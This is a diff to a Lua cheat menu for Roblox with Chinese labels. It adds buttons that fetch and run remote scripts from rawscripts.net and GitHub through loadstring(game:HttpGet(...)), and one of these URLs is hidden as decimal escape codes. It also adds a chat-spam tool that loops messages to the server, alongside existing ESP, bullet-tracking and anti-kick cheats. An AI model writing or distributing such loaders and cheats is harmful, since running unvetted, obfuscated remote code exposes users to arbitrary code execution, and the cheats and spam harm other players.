@@ -295,7 +295,10 @@ local function loadScript()
             {name = "PlayerESPButton", text = "透视玩家 [关闭]", desc = "透视显示其他玩家轮廓"},
             {name = "BulletTrackButton", text = "子弹追踪 [关闭]", desc = "子弹自动追踪最近玩家"},
             -- 移除导管中心和防踢，移动到其他脚本整合
-            {name = "AntiKickButton", text = "防踢", desc = "加载防踢脚本"}
+            {name = "AntiKickButton", text = "防踢", desc = "加载防踢脚本"},
+            -- 新添加的功能
+            {name = "SpamButton", text = "刷屏", desc = "聊天刷屏工具"},
+            {name = "FEBaconPrankButton", text = "FE培根脚本附属恶搞", desc = "FE培根脚本附属恶搞脚本"}
         },
         ["移动功能"] = {
             {name = "SpinButton", text = "人物旋转 [关闭]", desc = "让人物持续旋转"},
@@ -366,7 +369,9 @@ local function loadScript()
             {name = "FEFightingAnimButton", text = "FE格斗动作", desc = "加载FE格斗动作脚本"},
             {name = "FER6HeadlessButton", text = "FE R6无头", desc = "加载FE R6无头脚本"},
             {name = "FER15HeadlessButton", text = "FE R15无头", desc = "加载FE R15无头脚本"},
-            {name = "FEN00kla5KButton", text = "FE N00kla5K菜单", desc = "加载FE N00kla5K菜单脚本"}
+            {name = "FEN00kla5KButton", text = "FE N00kla5K菜单", desc = "加载FE N00kla5K菜单脚本"},
+            -- 新添加的FE索尼克
+            {name = "FESonicButton", text = "FE索尼克", desc = "加载FE索尼克脚本"}
         },
         ["黑洞功能"] = {
             {name = "BlackHoleV6Button", text = "黑洞v6", desc = "加载黑洞v6脚本"},
@@ -409,7 +414,9 @@ local function loadScript()
             {name = "NaturalDisasterButton", text = "自然灾害", desc = "加载自然灾害脚本"},
             {name = "MuscleLegendButton", text = "力量传奇", desc = "加载力量传奇脚本"},
             {name = "MuscleLegendChangeButton", text = "力量传奇改力量", desc = "加载力量传奇改力量脚本"},
-            {name = "PlayForsakenOnServerButton", text = "在服务器玩被遗弃脚本", desc = "在服务器玩被遗弃脚本"}
+            {name = "PlayForsakenOnServerButton", text = "在服务器玩被遗弃脚本", desc = "在服务器玩被遗弃脚本"},
+            -- 新添加的不知名黑壳脚本
+            {name = "UnknownBlackShellButton", text = "不知名黑壳脚本", desc = "加载不知名黑壳脚本"}
         },
         ["doors"] = {
             {name = "DoorsButton", text = "doors", desc = "加载doors脚本"},
@@ -439,7 +446,10 @@ local function loadScript()
             -- 新添加的unx脚本
             {name = "UNXScriptButton", text = "unx脚本", desc = "加载unx脚本"},
             -- 从基础功能移动过来的导管中心
-            {name = "ConduitCenterButton", text = "导管中心", desc = "加载导管中心脚本"}
+            {name = "ConduitCenterButton", text = "导管中心", desc = "加载导管中心脚本"},
+            -- 新添加的功能
+            {name = "SuperNBForeignScriptButton", text = "超级NB老外脚本", desc = "加载超级NB老外脚本"},
+            {name = "BSCenterButton", text = "bs中心", desc = "加载bs中心脚本"}
         },
         ["俄亥俄州"] = {
             -- 将所有俄亥俄州相关脚本移动到这里
@@ -2371,6 +2381,195 @@ print("安全版自然灾害免疫已激活")
         showNotification("FE N00kla5K菜单已加载!", Color3.fromRGB(0, 200, 0))
     end
 
+    -- ============ 新添加的功能函数（根据您的要求） ============
+
+    -- FE索尼克
+    local function loadFESonic()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Sonic-script-r15-READ-DESC-81391"))()
+        showNotification("FE索尼克已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 超级NB老外脚本
+    local function loadSuperNBForeignScript()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-XVC-Hub-170-Games-Keyless-58593"))()
+        showNotification("超级NB老外脚本已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 不知名黑壳脚本
+    local function loadUnknownBlackShell()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-1x93x1x-private-GUI-leaked-lol-81399"))()
+        showNotification("不知名黑壳脚本已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 刷屏功能
+    local function loadSpam()
+        playClickSound()
+        -- 简单实用的聊天刷屏脚本
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+        -- 创建UI
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "SimpleChatSpammer"
+        ScreenGui.Parent = PlayerGui
+
+        local Frame = Instance.new("Frame")
+        Frame.Size = UDim2.new(0, 300, 0, 200)
+        Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+        Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        Frame.BorderSizePixel = 0
+        Frame.Active = true
+        Frame.Draggable = true
+        Frame.Parent = ScreenGui
+
+        local Title = Instance.new("TextLabel")
+        Title.Size = UDim2.new(1, 0, 0, 30)
+        Title.Position = UDim2.new(0, 0, 0, 0)
+        Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Title.Text = "聊天刷屏工具"
+        Title.Font = Enum.Font.GothamBold
+        Title.TextSize = 16
+        Title.Parent = Frame
+
+        local MessageText = Instance.new("TextBox")
+        MessageText.Size = UDim2.new(0.9, 0, 0, 60)
+        MessageText.Position = UDim2.new(0.05, 0, 0.2, 0)
+        MessageText.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        MessageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        MessageText.PlaceholderText = "输入要发送的消息..."
+        MessageText.Text = "Hello!"
+        MessageText.Font = Enum.Font.Gotham
+        MessageText.TextSize = 14
+        MessageText.Parent = Frame
+
+        local IntervalText = Instance.new("TextBox")
+        IntervalText.Size = UDim2.new(0.4, 0, 0, 30)
+        IntervalText.Position = UDim2.new(0.05, 0, 0.55, 0)
+        IntervalText.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        IntervalText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        IntervalText.PlaceholderText = "间隔(秒)"
+        IntervalText.Text = "1"
+        IntervalText.Font = Enum.Font.Gotham
+        IntervalText.TextSize = 14
+        IntervalText.Parent = Frame
+
+        local StartButton = Instance.new("TextButton")
+        StartButton.Size = UDim2.new(0.4, 0, 0, 35)
+        StartButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+        StartButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
+        StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        StartButton.Text = "开始"
+        StartButton.Font = Enum.Font.GothamBold
+        StartButton.TextSize = 14
+        StartButton.Parent = Frame
+
+        local StopButton = Instance.new("TextButton")
+        StopButton.Size = UDim2.new(0.4, 0, 0, 35)
+        StopButton.Position = UDim2.new(0.55, 0, 0.75, 0)
+        StopButton.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+        StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        StopButton.Text = "停止"
+        StopButton.Font = Enum.Font.GothamBold
+        StopButton.TextSize = 14
+        StopButton.Parent = Frame
+
+        -- 刷屏功能
+        local Spamming = false
+
+        local function SendChat(Message)
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            
+            -- 尝试使用默认聊天系统
+            if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                local ChatEvents = ReplicatedStorage.DefaultChatSystemChatEvents
+                if ChatEvents:FindFirstChild("SayMessageRequest") then
+                    ChatEvents.SayMessageRequest:FireServer(Message, "All")
+                    return true
+                end
+            end
+            
+            -- 尝试使用TextChatService (新版本)
+            local TextChatService = game:GetService("TextChatService")
+            if TextChatService then
+                local Channels = TextChatService:FindFirstChild("TextChannels")
+                if Channels then
+                    local General = Channels:FindFirstChild("RBXGeneral") or Channels:FindFirstChild("General")
+                    if General then
+                        General:SendAsync(Message)
+                        return true
+                    end
+                end
+            end
+            
+            return false
+        end
+
+        StartButton.MouseButton1Click:Connect(function()
+            if Spamming then return end
+            
+            local Message = MessageText.Text
+            local Interval = tonumber(IntervalText.Text) or 1
+            
+            if Message == "" then
+                return
+            end
+            
+            Spamming = true
+            StartButton.BackgroundColor3 = Color3.fromRGB(40, 140, 40)
+            
+            spawn(function()
+                while Spamming do
+                    local Success = SendChat(Message)
+                    wait(Interval)
+                end
+            end)
+        end)
+
+        StopButton.MouseButton1Click:Connect(function()
+            Spamming = false
+            StartButton.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
+        end)
+
+        -- 关闭按钮
+        local CloseButton = Instance.new("TextButton")
+        CloseButton.Size = UDim2.new(0, 25, 0, 25)
+        CloseButton.Position = UDim2.new(0.95, -25, 0, 5)
+        CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CloseButton.Text = "X"
+        CloseButton.Font = Enum.Font.GothamBold
+        CloseButton.TextSize = 14
+        CloseButton.Parent = Frame
+
+        CloseButton.MouseButton1Click:Connect(function()
+            Spamming = false
+            ScreenGui:Destroy()
+        end)
+
+        print("聊天刷屏工具加载成功！")
+        showNotification("聊天刷屏工具已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- bs中心
+    local function loadBSCenter()
+        playClickSound()
+        BS="\104\116\116\112\115\58\47\47\103\105\116\101\101\46\99\111\109\47\66\83\95\115\99\114\105\112\116\47\115\99\114\105\112\116\47\114\97\119\47\109\97\115\116\101\114\47\66\83\95\83\99\114\105\112\116\46\76\117\97\117"
+        loadstring(game:HttpGet(BS))()
+        showNotification("bs中心已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE培根脚本附属恶搞
+    local function loadFEBaconPrank()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Baconhead123/ai/refs/heads/main/培根恶搞"))()
+        showNotification("FE培根脚本附属恶搞已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
     -- 绑定按钮事件
     MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
     CloseButton.MouseButton1Click:Connect(function()
@@ -2405,6 +2604,9 @@ print("安全版自然灾害免疫已激活")
         PlayerESPButton = togglePlayerESP,
         BulletTrackButton = toggleBulletTrack,
         AntiKickButton = loadAntiKick,
+        -- 新添加的功能
+        SpamButton = loadSpam,
+        FEBaconPrankButton = loadFEBaconPrank,
         
         -- 移动功能
         SpinButton = toggleSpin,
@@ -2475,6 +2677,8 @@ print("安全版自然灾害免疫已激活")
         FER6HeadlessButton = loadFER6Headless,
         FER15HeadlessButton = loadFER15Headless,
         FEN00kla5KButton = loadFEN00kla5K,
+        -- 新添加的FE索尼克
+        FESonicButton = loadFESonic,
         
         -- 黑洞功能
         BlackHoleV6Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V6.txt", "黑洞v6") end,
@@ -2522,6 +2726,8 @@ print("安全版自然灾害免疫已激活")
         MuscleLegendButton = loadMuscleLegend,
         MuscleLegendChangeButton = loadMuscleLegendChange,
         PlayForsakenOnServerButton = loadPlayForsakenOnServer,
+        -- 新添加的不知名黑壳脚本
+        UnknownBlackShellButton = loadUnknownBlackShell,
         
         -- doors
         DoorsButton = loadDoors,
@@ -2559,6 +2765,9 @@ print("安全版自然灾害免疫已激活")
         ShaScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/114514lzkill/SaHUB/refs/heads/main/SaHUB", "沙脚本") end,
         UNXScriptButton = loadUNXScript,
         ConduitCenterButton = loadConduitCenter,
+        -- 新添加的功能
+        SuperNBForeignScriptButton = loadSuperNBForeignScript,
+        BSCenterButton = loadBSCenter,
         
         -- 俄亥俄州
         OhioButton = function() loadExternalScript("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou", "俄亥俄州脚本") end,
